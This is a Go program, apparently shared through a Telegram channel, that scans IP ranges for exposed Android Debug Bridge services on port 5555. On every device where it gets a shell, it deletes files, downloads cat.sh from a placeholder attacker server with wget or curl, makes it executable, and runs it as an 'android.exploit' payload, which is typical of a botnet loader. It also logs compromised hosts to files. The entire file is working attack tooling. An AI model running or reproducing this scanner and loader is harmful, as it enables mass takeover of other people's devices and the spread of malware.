//t.me/DaOnlySpark
package main
import (
    "bufio"
    "encoding/binary"
    "flag"
    "fmt"
    "net"
    "os"
    "strings"
    "sync"
    "time"
)

const (
    CMD_CNXN = 0x4e584e43
    CMD_OPEN = 0x4e45504f
    CMD_WRTE = 0x45545257
    CMD_CLSE = 0x45534c43
    VERSION  = 0x01000000
    MAXDATA  = 4096
)

func main() {
    concurrency := flag.Int("c", 512, "workers")
    port := flag.Int("p", 5555, "port")
    timeout := flag.Duration("t", 1000*time.Millisecond, "timeout")
    outPath := flag.String("o", "adb.txt", "output file for all adb")
    shellPath := flag.String("s", "shell.txt", "output file for valid shells")
    flag.Parse()

    ips := make(chan string, *concurrency*2)
    results := make(chan string, *concurrency*2)

    var wg sync.WaitGroup
    wg.Add(*concurrency)
    for i := 0; i < *concurrency; i++ {
        go func() {
            defer wg.Done()
            for ip := range ips {
                start := time.Now()
                if shell := checkADB(ip, *port, *timeout); shell != "" {
                    fmt.Printf("[%s] %s:%d %s (%.2fs)\n",
                        time.Now().Format("15:04:05"),
                        ip, *port, shell,
                        time.Since(start).Seconds())
                    results <- fmt.Sprintf("SHELL %s:%d %s", ip, *port, shell)
                } else if ok := detectADB(ip, *port, *timeout); ok {
                    fmt.Printf("[%s] %s:%d (%.2fs)\n",
                        time.Now().Format("15:04:05"),
                        ip, *port,
                        time.Since(start).Seconds())
                    results <- fmt.Sprintf("ADB %s:%d", ip, *port)
                }
            }
        }()
    }

    done := make(chan struct{})
    go func() {
        fAll, _ := os.OpenFile(*outPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        fShell, _ := os.OpenFile(*shellPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        defer fAll.Close()
        defer fShell.Close()
        for entry := range results {
            if strings.HasPrefix(entry, "SHELL") {
                parts := strings.SplitN(entry, " ", 3)
                ipport := parts[1]
                fShell.WriteString(ipport + "\n")
                fShell.Sync()
                fAll.WriteString(ipport + "\n")
                fAll.Sync()
            } else if strings.HasPrefix(entry, "ADB") {
                ipport := strings.TrimPrefix(entry, "ADB ")
                fAll.WriteString(ipport + "\n")
                fAll.Sync()
            }
        }
        close(done)
    }()

    sc := bufio.NewScanner(os.Stdin)
    for sc.Scan() {
        line := strings.TrimSpace(sc.Text())
        if line != "" {
            ips <- line
        }
    }
    close(ips)
    wg.Wait()
    close(results)
    <-done
}

func sendPacket(conn net.Conn, cmd, arg0, arg1 uint32, payload []byte) {
    header := make([]byte, 24)
    binary.LittleEndian.PutUint32(header[0:], cmd)
    binary.LittleEndian.PutUint32(header[4:], arg0)
    binary.LittleEndian.PutUint32(header[8:], arg1)
    binary.LittleEndian.PutUint32(header[12:], uint32(len(payload)))
    var sum uint32
    for _, b := range payload {
        sum += uint32(b)
    }
    binary.LittleEndian.PutUint32(header[16:], sum)
    binary.LittleEndian.PutUint32(header[20:], cmd^0xffffffff)
    conn.Write(append(header, payload...))
}

func detectADB(ip string, port int, timeout time.Duration) bool {
    addr := net.JoinHostPort(ip, fmt.Sprintf("%d", port))
    conn, err := net.DialTimeout("tcp", addr, timeout)
    if err != nil {
        return false
    }
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(timeout))
    sendPacket(conn, CMD_CNXN, VERSION, MAXDATA, []byte("host::\x00"))
    buf := make([]byte, 4096)
    n, _ := conn.Read(buf)
    if n < 24 {
        return false
    }
    cmd := binary.LittleEndian.Uint32(buf[0:4])
    return cmd == CMD_CNXN
}

func checkADB(ip string, port int, timeout time.Duration) string {
    addr := net.JoinHostPort(ip, fmt.Sprintf("%d", port))
    conn, err := net.DialTimeout("tcp", addr, timeout)
    if err != nil {
        return ""
    }
    defer conn.Close()
    
    conn.SetDeadline(time.Now().Add(60 * time.Second))

    sendPacket(conn, CMD_CNXN, VERSION, MAXDATA, []byte("host::\x00"))
    buf := make([]byte, 16384)
    n, _ := conn.Read(buf)
    if n < 24 {
        return ""
    }
    if binary.LittleEndian.Uint32(buf[0:4]) != CMD_CNXN {
        return ""
    }

    sendPacket(conn, CMD_OPEN, 1, 0, []byte("shell:echo hello\n"))
    
    var response strings.Builder
    helloFound := false
    startTime := time.Now()
    
    for time.Since(startTime) < 60*time.Second {
        conn.SetReadDeadline(time.Now().Add(5 * time.Second))
        n, err := conn.Read(buf)
        if err != nil {
            break
        }
        
        if n < 24 {
            continue
        }
        
        cmd := binary.LittleEndian.Uint32(buf[0:4])
        dataLen := int(binary.LittleEndian.Uint32(buf[12:16]))
        
        if cmd == CMD_WRTE && n >= 24+dataLen {
            response.Write(buf[24 : 24+dataLen])
            if strings.Contains(response.String(), "hello") {
                helloFound = true
            }
        }
        
    }
    
    if helloFound {
        sendPacket(conn, CMD_OPEN, 2, 0, []byte("shell:cd /data/local/tmp; rm -rf cat.sh; rm -rf iran.*; wget http://your_server_ip/cat.sh || curl http://your_server_ip/cat.sh -o cat.sh; chmod 777 cat.sh; ./cat.sh android.exploit\n"))
        
        time.Sleep(40 * time.Second)
        
        sendPacket(conn, CMD_CLSE, 1, 0, nil)
        sendPacket(conn, CMD_CLSE, 2, 0, nil)
        
        return "SHELL"
    }
    
    return ""
}